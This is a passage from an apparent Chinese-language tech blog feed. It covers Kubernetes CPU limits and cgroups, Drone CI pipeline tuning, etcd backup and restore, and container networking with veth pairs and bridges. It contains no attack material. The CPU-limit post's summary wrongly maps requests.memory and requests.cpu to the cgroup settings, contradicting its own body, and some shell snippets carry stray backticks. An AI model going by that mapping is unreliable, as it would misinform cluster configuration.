inspect</code> 還是找得出來</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">❯ podman inspect be5cb3e60f7b | grep -A5 "PortBindings"</span><br><span class="line">            "PortBindings": {</span><br><span class="line">                "80/tcp": [</span><br><span class="line">                    {</span><br><span class="line">                        "HostIp": "",</span><br><span class="line">                        "HostPort": "8888"</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">❯ podman inspect 9a2adbd0e86c | grep -A5 "PortBindings"</span><br><span class="line">            "PortBindings": {</span><br><span class="line">                "80/tcp": [</span><br><span class="line">                    {</span><br><span class="line">                        "HostIp": "",</span><br><span class="line">                        "HostPort": "45521"</span><br><span class="line">                    }</span><br></pre></td></tr></tbody></table></figure><p>至於一些複雜的用法暫時還沒有測試過，也不確定差異是否很大</p><p>我想最大的差異可能還是會在 networking 的部分，Podman 官方也有給出<a href="https://github.com/containers/podman/blob/main/docs/tutorials/basic_networking.md" target="_blank" rel="noopener">一頁介紹</a>來說明 Podman 的網路架構</p><p>這部分就等到有時間研究完之後再來補上使用心得了 😅</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="podman" scheme="https://blog.yiyu0x.org/tags/podman/"/>
    
      <category term="container" scheme="https://blog.yiyu0x.org/tags/container/"/>
    
  </entry>
  
  <entry>
    <title>理解 Kubernetes 中的 CPU Limit</title>
    <link href="https://blog.yiyu0x.org/2021/12/13/"/>
    <id>https://blog.yiyu0x.org/2021/12/13/</id>
    <published>2021-12-13T00:50:50.000Z</published>
    <updated>2025-04-12T20:59:43.595Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Kubernetes 中的資源限制目前可以對兩種資源做限制，分別為 <code>cpu</code>（可壓縮資源）, <code>memory</code>（不可壓縮資源）。針對這兩種資源的限制可以對應到兩種限制，分別為 Soft Limit（request）與 Hard Limit（limit）</p><p>cgroup 對於這兩種資源達到 Hard Limit 的處理並不相同。記憶體超出 Hard Limit 會觸發 OOM；CPU 超出 Hard Limit 則是會造成 CPU Throttling（程式並不會被終止）</p><p>在 Cgroup 中使用針對 K8s Pod yaml 所定義之 Soft Limit：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spec.containers[].resources.requests.memory</span><br></pre></td></tr></tbody></table></figure><p>會讓 Cgroup 設定系統之 <code>cpu.shares</code> 參數</p><p>而 Hard Limit：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spec.containers[].resources.requests.cpu</span><br></pre></td></tr></tbody></table></figure><p>會讓 Cgroup 設定系統之 <code>cpu.cfs_period_us</code>, <code>cpu.cfs_quota_us</code> 參數</p><h2 id="cpu-shares"><a href="#cpu-shares" class="headerlink" title="cpu.shares"></a>cpu.shares</h2><p>當我們在 Pod 之 yaml 中定義 <code>spec.containers[].resources.requests.cpu</code>：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  containers:</span></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">busybox</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">hwchiu/netutils</span></span><br><span class="line"><span class="attr">    args:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">sleep</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">infinity</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="attr">      requests:</span></span><br><span class="line"><span class="attr">        cpu:</span> <span class="string">"500m"</span></span><br></pre></td></tr></tbody></table></figure><p>可以從對應節點的路徑發現各種 cgroup 參數</p><p><code>/sys/fs/cgroup/cpu,cpuacct/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod<Pod-uid>.slice</code></p><p>(因為只有設定 request 所以是進入 burstable 目錄，關於 Pod QoS 可以參考 Kubernetes 官方文件)</p><p>此時可以發現</p><p>檔案：cpu.cfs_quota_us 的內容為 <code>-1</code>（因為沒有設定 Hard Limit，-1 代表不受限制），而 cpu.shares 的內容為 <code>512</code>（與設定的 500m 不相同是因為 cgroup 以 1024 為底，yaml 以 1000 為底）</p><p>而這個 512 會讓該 Pod（以下稱為 Pod A）具有</p><p>512 / (512 + Other Pod cpu.shares) 的 CPU 使用時間</p><p>假設叢集中只有兩個 Pod，另外一個 Pod 的 cpu.shares 為 1024</p><p>則 Pod A 的使用時間有</p><p>512/(512 + 1024) = 33%</p><p>這種相對的設定方式很明顯的可以發現並沒有辦法實質控制 Pod 在 CPU 的時間分配</p><h2 id="cpu-cfs-quota-us"><a href="#cpu-cfs-quota-us" class="headerlink" title="cpu.cfs_quota_us"></a>cpu.cfs_quota_us</h2><p>然而如果設定的 Pod yaml 為：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">resources:</span></span><br><span class="line"><span class="attr">  requests:</span></span><br><span class="line"><span class="attr">    cpu:</span> <span class="string">"500m"</span></span><br><span class="line"><span class="attr">  limits:</span></span><br><span class="line"><span class="attr">    cpu:</span> <span class="string">"900m"</span></span><br></pre></td></tr></tbody></table></figure><p>可以發現 cpu.cfs_period_us 的值為 <code>100000</code>，以及 cpu.cfs_quota_us 的值為 <code>90000</code></p><p>100000 的含義代表 CPU 一個週期，也就是 1/10 秒（100000 微秒）</p><p>90000 代表在這個週期內，該 Pod 最高可以使用的時間為 90000 微秒，也就是 yaml 中設定的 900m</p><p>換句說話，如果我們要讓 Pod 在一個 CPU 週期可以完全跑滿，那就要設定 1000m</p><p>如果使用到上限，程式還沒結束，該 CPU 週期內的該程式就會被 Throttling，留到下一個週期才能繼續執行</p><p>但是一但設定了 Hard Limit 同時代表系統上的 CPU 不忙碌，該 Pod 也無法使用更多的 CPU 時間</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><ul><li><a href="https://www.youtube.com/watch?v=UE7QX98-kO0" target="_blank" rel="noopener">Throttling: New Developments in Application Performance with CPU Limits - Dave Chiluk, Indeed</a></li><li><a href="https://zhuanlan.zhihu.com/p/433065108" target="_blank" rel="noopener">k8s CPU limit 和 throttling 的迷思</a></li></ul></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://blog.yiyu0x.org/tags/Kubernetes/"/>
    
      <category term="cgroup" scheme="https://blog.yiyu0x.org/tags/cgroup/"/>
    
  </entry>
  
  <entry>
    <title>一次 CI/CD 調教經驗</title>
    <link href="https://blog.yiyu0x.org/2021/11/07/"/>
    <id>https://blog.yiyu0x.org/2021/11/07/</id>
    <published>2021-11-07T11:05:24.000Z</published>
    <updated>2025-04-12T20:59:43.591Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近受朋友委託，協助改善了一個現有的 CI/CD Pipeline 流程。對方的專案主要是一群熟悉軟體的設計的開發者所開發，但團隊中並沒有人對於維護 Pipeline 有相關經驗，於是我接下任務，一方面也想看一下在調教前與調教之後可以得到多大的效益提升。對於一個沒有開發該專案的人來說，最快了解專案整體的整合與部署流程的方式就是直接去看現有的 Pipeline。於是我打算從檢視 Pipeline 開始下手，看有哪些地方可以改良。</p><h2 id="Runner-的選擇"><a href="#Runner-的選擇" class="headerlink" title="Runner 的選擇"></a>Runner 的選擇</h2><p>對方當時為了快速將 Pipeline 搭建上線，所以在選擇 Runner 的時候選擇了一個最快速（但可能不安全）的 Runner，也就是 Exec Runner（對方採用的 CI 工具為 Drone CI ）。然而因為移植性的關係，我們都會希望自己的 Pipeline 環境可以跑在容器之中，方便後續的遷移以及不耦合於特定作業系統。於是我將對方伺服器上的 Runner 重新架設了 Docker Runner，並且將原有的 <code>.drone.yml</code> 設定檔由 Exec Runner 形式轉換成 Docker Runner，結果馬上遇到了第一個問題</p><blockquote><p>原本的 CI 整合測試的時間由 2 分鐘直接變成了 8 分鐘。</p></blockquote><p>經過後續的排查才發現原來對方的 Exec Runner 在執行 Maven 打包時，因為是直接在作業系統上開啟 Process 來處理，所以每一次執行都是一樣的環境，造成後續進行打包的時候都是共用 <code>/root/.m2/repository</code> 裡面的套件，造成每一次 CI 其實都在快取之前用過的套件，並不是完全乾淨的環境。若使用 Docker Runner，也想要類似的快取行為，就只能透過共享特定 host 上的目錄來達成，在 DroneCI 中此類的設定也是非常好撰寫。</p><h2 id="Docker-in-Docker"><a href="#Docker-in-Docker" class="headerlink" title="Docker in Docker"></a>Docker in Docker</h2><p>接下來這個問題幾乎是所有 CI/CD 平台 的 Docker Runner 都會遇到的問題。如何在 CI/CD Stage 中使用 Docker 指令來建構 Docker Image？這個問題的解法大致上可分為兩種（DinD 與 DooD）。然而最快的方法是直接將 <code>/var/run/docker.sock</code> 掛載於 Stage 的 Container 中，來達到可以在容器之中透過 UNIX Sock 與 host 上的 Docker Engine 溝通（當然還要有 docker cli）。實際上在執行 Pipeline 時，發現在對方專案中的 testcontainer 在進行整合測試時，嘗試去連線自己（Maven 中的 testcontainer）所建立出來 testcontainers/ryuk 容器，並且因為無法正常連線至該容器而導致錯誤。後來查看了系統環境才發現對方 Runner 的機器上使用 ufw 去管理防火牆</p><blockquote><p>ufw 會將 iptables 中的 INPUT chain (filter table) Policy 改成 DROP</p></blockquote><p>造成 Drone CI Stage 中的 Container 無法正常存取其他 Container，主要因為 Drone CI 因為安全原因所以將這些 Stage 開出來的 Container 都放在獨立的 Linux Bridge 之下，而不是預設的 docker0，這時候跨介面的通訊會因為 iptables 規則而被擋下（當時 ufw 為開啟狀態）。</p><h2 id="latest-tag-造成的隱含行為"><a href="#latest-tag-造成的隱含行為" class="headerlink" title="latest tag 造成的隱含行為"></a>latest tag 造成的隱含行為</h2><p>將 Pipeline 整理得差不多時，發現在 CD 階段時的基礎設施都是用 docker-compose 執行，可是這些 Image 並沒有指定 Image tag（預設採用 latest）。於是使用了 docker images 指令發現這些 Image 都是在數個月之前被拉到本地端的，無法得知當時版本，也就沒辦法指定特定版本來維持專案的移植性。使用 Image 的 id 在 docker hub 上面搜尋可能是一個辦法，但是 docker hub 並沒有提供讓用戶直接用 Image id 來搜尋的方式。在網路上找了一些工具也沒有解決想知道這些 Image 到底是哪一個版本的問題。在最後使用 docker inspect 時無意間看到</p><blockquote><p>ContainerConfig 欄位，其中的 Env 欄位中有應用程式的版本資訊</p></blockquote><p>雖然沒有辦法完全知道 Image 的 tag，但是知道 Image 中應用程式的版本也可以方便使用這些版本來進行測試，測試沒問題後就將這些版本都固定，避免日後轉移時因為 latest 標籤而無法確定版本。</p><h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><p>這篇為這幾天最佳化 Pipeline 後的紀錄小總結，在將這些初步的最佳化完成之後。之後則會進行一些設計方向的最佳化，包含</p><ul><li>如何規劃快取才可以加速流程但不希望因此而造成測試不乾淨</li><li>如何設計一個可以在 monorepo 的專案中，不用因為改了 A，就將全部的微服務（A, B, C）重新打包</li><li>使否需要一個儲存敏感資訊的區域，讓多個 Runner 在部署時可以去拉取資訊（而不透過 host 共享檔案）</li></ul></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CI/CD" scheme="https://blog.yiyu0x.org/tags/CI-CD/"/>
    
      <category term="Docker" scheme="https://blog.yiyu0x.org/tags/Docker/"/>
    
      <category term="DroneCI" scheme="https://blog.yiyu0x.org/tags/DroneCI/"/>
    
  </entry>
  
  <entry>
    <title>如何備份 Kubernetes 中的 etcd</title>
    <link href="https://blog.yiyu0x.org/2021/05/21/"/>
    <id>https://blog.yiyu0x.org/2021/05/21/</id>
    <published>2021-05-21T12:29:50.000Z</published>
    <updated>2025-04-12T20:59:43.592Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>Kubernetes 中的狀態都是用 etcd 這套 key-value 儲存工具來維持，也就是說我們只要備份好 etcd 後，就可以很輕易的重建一個一模一樣的 Cluster 起來。</p><p>要備份 etcd 可以使用 etcdctl 這套 cli 工具來簡單完成</p><p>因為 etcd 分了 v2, v3 兩種版本，彼此不相容，所以在使用 cli 工具時需要指定版本</p><p>在操作時，我們會需要 cert 位置與 key 的位置，如果你的 Cluster 是透過 kubeadm 安裝，那麼位置都會在 <code>/etc/kubernetes/pki/etcd</code> 中</p><p>我們可以先透過 <code>etcdctl member list</code> 來確認是否可以正確連線到我們的 etcd</p><p>以下都假設我的 etcd 位置在 <code>10.10.10.10</code></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ETCDCTL_API=3 etcdctl member list \</span><br><span class="line">--endpoints https://10.10.10.10:2379 \</span><br><span class="line">--cert=/etc/kubernetes/pki/etcd/server.crt \</span><br><span class="line">--key=/etc/kubernetes/pki/etcd/server.key \</span><br><span class="line">--insecure-skip-tls-verify</span><br></pre></td></tr></tbody></table></figure><p>如果覺得指令太長的話，etcdctl 預設會去吃環境變數，也可以在環境變數中設定</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ETCDCTL_CERT_FILE='/etc/kubernetes/pki/etcd/server.crt'</span><br><span class="line">export ETCDCTL_KEY_FILE='/etc/kubernetes/pki/etcd/server.key'</span><br><span class="line">export ETCDCTL_ENDPOINTS='https://10.10.10.10:2379'</span><br></pre></td></tr></tbody></table></figure><p>不確定這些資訊在哪裡的話，可以直接去看你 etcd 的 yaml 就可以看到了，這些資訊會在 etcd 的啟動參數中</p><h2 id="匯出"><a href="#匯出" class="headerlink" title="匯出"></a>匯出</h2><p>確認可以連線之後，我們將 etcd 的內容完整的匯出，命名為 <code>etcd-snapshot-$(date +%Y%m%d).db</code></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ETCDCTL_API=3 etcdctl snapshot save /root/etcd-snapshot-$(date +%Y%m%d).db \</span><br><span class="line">--endpoints https://10.10.10.10:2379 \</span><br><span class="line">--cert=/etc/kubernetes/pki/etcd/server.crt \</span><br><span class="line">--key=/etc/kubernetes/pki/etcd/server.key \</span><br><span class="line">--insecure-skip-tls-verify</span><br></pre></td></tr></tbody></table></figure><p>output:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Snapshot saved at /root/etcd-snapshot-20210521.db</span><br></pre></td></tr></tbody></table></figure><h2 id="匯入"><a href="#匯入" class="headerlink" title="匯入"></a>匯入</h2><p>匯出相較匯出麻煩一些，我們需要先讓 api-server 與 etcd 都終止，重新將 etcd 的資料匯入之後再重新打開它們。</p><p>我的 api-server 與 etcd 都是以 static pod 的方式存在，所以只要將對應的 yaml 檔案暫時移除 static pod 目錄即可</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/kubernetes/manifests/etcd.yaml /root/etcd.yaml</span><br><span class="line">mv /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml</span><br></pre></td></tr></tbody></table></figure><p>接著我們將舊的 etcd 資料暫時移開（同時進行備份）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /var/lib/etcd/default.etcd /var/lib/etcd/default.etcd.bak</span><br></pre></td></tr></tbody></table></figure><p>將新的剛才匯出的 etcd 資料重新匯入</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ETCDCTL_API=3 etcdctl snapshot restore /root/etcd-snapshot-20210521.db \</span><br><span class="line">--name etcd-0 \</span><br><span class="line">--initial-cluster "etcd-0=https://10.10.10.10:2380" \</span><br><span class="line">--initial-cluster-token etcd-cluster \</span><br><span class="line">--initial-advertise-peer-urls https://10.10.10.10:2380 \</span><br><span class="line">--data-dir=/var/lib/etcd/default.etcd</span><br></pre></td></tr></tbody></table></figure><p>output:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2021-05-21 07:42:36.826573 I | mvcc: restore compact to 3969180</span><br><span class="line">2021-05-21 07:42:36.840090 I | etcdserver/membership: added member 9ce23f330769428b [https://10.10.10.10:2380] to cluster 457ee8b0c2eda630</span><br></pre></td></tr></tbody></table></figure><p>匯出之後再把 api-server 與 etcd 重啟就可以了</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /root/etcd.yaml /etc/kubernetes/manifests/etcd.yaml</span><br><span class="line">mv /root/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>使用 iproute2 客製化你的 Container 網路</title>
    <link href="https://blog.yiyu0x.org/2021/04/29/"/>
    <id>https://blog.yiyu0x.org/2021/04/29/</id>
    <published>2021-04-29T12:40:21.000Z</published>
    <updated>2025-04-12T20:59:43.591Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我們都知道 Docker 有提供不同的網路模式供我們使用，從預設的 Bridge 到共用本機 Network Namespace 的 Host。我們甚至可以自訂自己的 Bridge 來切割不同網段，如此一來一些網路拓墣都架設都可以用 Docker 來完成。</p><p>區別不同網段我們通常會使用不同的 Bridge 來分隔，通常會先建立自訂的 Bridge</p><p><code>docker network create --driver bridge testing-bridge</code></p><p>之後建立 container 時可以指定該 bridge 來使用該網路空間</p><p><code>docker run -it --net=testing-bridge alpine</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ # ip a</span><br><span class="line">1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">35: eth0@if36: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP</span><br><span class="line">    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></tbody></table></figure><p>這時候可以發現 Docker 幫我建立好了 <code>172.18.0.2/16</code> 網段的介面可以使用，這時候你會發現該介面可以直接出得去外網，因為 Docker 建立好 Bridge，所以封包會從該 Bridge 到本機端出去。</p><p>那我們可不可以不要讓 Container 有機會從本機讓封包流出去呢？</p><p>（有時候要建立網路拓墣，不希望封包走本機的路由出去，希望封包從該網路路由到其他網路，也就是其他 Container）</p><h2 id="解決（使用-veth-peer）"><a href="#解決（使用-veth-peer）" class="headerlink" title="解決（使用 veth peer）"></a>解決（使用 veth peer）</h2><p>要達成這件事，最快的做法就是自己建立 veth 並且將 peer 兩端直接綁在兩個 Container 上</p><p>我們打算用 iproute2 直接管理網路，所以建立 containers 時使用 <code>--net=none</code></p><p><code>docker run -itd --name=left --net=none alpine</code><br><code>docker run -itd --name=right --net=none alpine</code></p><p>接著需要自行建立 Containers 們的 Network Namespace</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left_pid=$(docker inspect -f '{{.State.Pid}}' left)`</span><br><span class="line">right_pid=$(docker inspect -f '{{.State.Pid}}' right)`</span><br><span class="line">sudo mkdir -p /var/run/netns</span><br><span class="line">sudo ln -s /proc/$left_pid/ns/net /var/run/netns/$left_pid</span><br><span class="line">sudo ln -s /proc/$right_pid/ns/net /var/run/netns/$right_pid</span><br></pre></td></tr></tbody></table></figure><p>接著建立 veth peer 並且命名為 <code>A</code> 以及 <code>B</code></p><p><code>ip link add A type veth peer name B</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip link set A netns $left_pid # 設定 peer 端 A 到 left container</span><br><span class="line">ip netns exec $left_pid ip link set dev A name eth0 # 設定 namespace 中的介面名稱</span><br><span class="line">ip netns exec $left_pid ip link set eth0 up # 啟動介面</span><br><span class="line">ip netns exec $left_pid ip addr add 10.113.1.1/24 dev eth0 # 設定 IP</span><br><span class="line">#ip netns exec $left_pid ip route add default via 10.113.1.254</span><br></pre></td></tr></tbody></table></figure><p>新增預設路由的部分註解掉是因為我們將 Containers 用 veth peer 接起來，本來就是通的，所以不需要有預設路由也可以到達另外一個 Container。可以依照情況去設定你的預設路由</p><p>接著設定 Container right</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip link set B netns $right_pid</span><br><span class="line">ip netns exec $right_pid ip link set dev B name eth0</span><br><span class="line">ip netns exec $right_pid ip link set eth0 up</span><br><span class="line">ip netns exec $right_pid ip addr add 10.113.1.2/24 dev eth0</span><br><span class="line">#ip netns exec $right_pid ip route add default via 10.113.1.254</span><br></pre></td></tr></tbody></table></figure><p>設定完之後進去 Containers 你會發現他的網路介面為</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@docker-env:~$ docker exec -it left sh</span><br><span class="line">/ # ip a</span><br><span class="line">1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">33: eth0@if32: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP qlen 1000</span><br><span class="line">    link/ether 4e:1b:e1:22:8c:05 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.113.1.1/24 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></tbody></table></figure><p>並且可以直接 ping 到另外一個 Container</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # ping 10.113.1.2</span><br><span class="line">PING 10.113.1.2 (10.113.1.2): 56 data bytes</span><br><span class="line">64 bytes from 10.113.1.2: seq=0 ttl=64 time=0.062 ms</span><br><span class="line">64 bytes from 10.113.1.2: seq=1 ttl=64 time=0.155 ms</span><br></pre></td></tr></tbody></table></figure><p>如此一來可以用此概念（搭配 Bridge）完成一些複雜的網路情境</p><h2 id="使用-Bridge"><a href="#使用-Bridge" class="headerlink" title="使用 Bridge"></a>使用 Bridge</h2><p>實際的網路情況不太可能都用 peer 去接，就達成一個區網內有多台 Host 還是需要使用 Linux Bridge。就像 Docker 預設的 Bridge 模式般，那我們可不可以不要透過 Docker，自己建立 Bridge 來達成網路隔離，答案是可以。自己建立的話你會發現 Docker 除了把 Bridge 建立好以外，還會使用 iptables 把 Container 中的流量從 Host 往外送，我們如果不想要讓封包有機會從 Host 流出，自己建立 Bridge 把 veth peer 一端接上 Container 一端接上 Bridge 也是一個方法！</p><p>首先，一樣建立兩個 Containers</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --network=none --name left alpine</span><br><span class="line">docker run -itd --network=none --name right alpine</span><br></pre></td></tr></tbody></table></figure><p>接下來手動建立 Linux Bridge</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brctl addbr br0</span><br><span class="line">ip link set dev br0 up</span><br></pre></td></tr></tbody></table></figure><p>建立 veth peer 並且命名為 left-eth0, left-veth0<br>left-eth0 這端要放入 Container 的 Network Namespace 中</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link add dev left-eth0 type veth peer name left-veth0</span><br><span class="line">ip link add dev right-eth0 type veth peer name right-veth0</span><br></pre></td></tr></tbody></table></figure><p>此時你的 Host 上會有四個新增的介面</p><p>取得 Containers 的 Pid 用來將 peer 加入該 Pid 的 Network Namespace</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left_pid=$(docker inspect left -f {{.State.Pid}})</span><br><span class="line">right_pid=$(docker inspect right -f {{.State.Pid}})</span><br><span class="line"></span><br><span class="line">ip link set left-eth0 netns ${left_pid} name eth0</span><br><span class="line">ip link set right-eth0 netns ${right_pid} name eth0</span><br></pre></td></tr></tbody></table></figure><p>加入成功後，在 Host 上可以看到網卡從剛才的四個變成兩個</p><p>在 Container 中也會看到裡面的介面多了 eth0</p><p>將 veth peer 另一端接上我們自行新增的 Linux Bridge，並且將網卡啟動</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">brctl addif br0 left-veth0</span><br><span class="line">brctl addif br0 right-veth0</span><br><span class="line"></span><br><span class="line">ip link set dev left-veth0 up</span><br><span class="line">ip link set dev right-veth0 up</span><br></pre></td></tr></tbody></table></figure><p>接下來我們要從 Host 上設定 Container 中的介面，因為該已經在不同網路空間，所以我們需要自行 mapping，不然 iproute2 會找不到該網路介面</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/$left_pid/ns/net /var/run/netns/$left_pid</span><br><span class="line">ln -s /proc/$right_pid/ns/net /var/run/netns/$right_pid</span><br><span class="line">ip netns show</span><br></pre></td></tr></tbody></table></figure><p>那為何不在 Container 中做設定？因為這樣子需要 Container 具備特定的 Linux Capability</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip netns exec $left_pid ip addr add 10.113.1.1/24 dev eth0</span><br><span class="line">ip netns exec $left_pid ip link set eth0 up</span><br><span class="line">ip netns exec $right_pid ip addr add 10.113.1.2/24 dev eth0</span><br><span class="line">ip netns exec $right_pid ip link set eth0 up</span><br></pre></td></tr></tbody></table></figure><p>接下來就可以使用 ping 來檢查是否 Containers 之間網路有通</p><p>docker exec left ping 10.113.1.2 -c3<br>docker exec right ping 10.113.1.1 -c3</p><p>如果沒通的話，可以看一下 